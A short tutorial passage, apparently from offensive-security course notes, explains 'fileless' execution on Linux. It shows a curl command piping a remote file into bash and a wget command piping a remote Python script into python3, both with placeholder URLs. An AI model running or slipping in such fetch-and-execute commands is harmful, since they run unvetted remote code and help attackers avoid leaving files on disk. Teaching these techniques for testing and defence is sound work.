----
Because of the way Linux works and how pipes operate, most of the tools we use in Linux can be used to replicate fileless operations, which means that we don't have to download a file to execute it.
#### Fileless Download with cURL
```bash
curl https://<url>/file | bash
```

Similarly, we can download a Python script file from a web server and pipe it into the Python binary.
```bash
wget -qO- https://<url>/file.py | python3
```

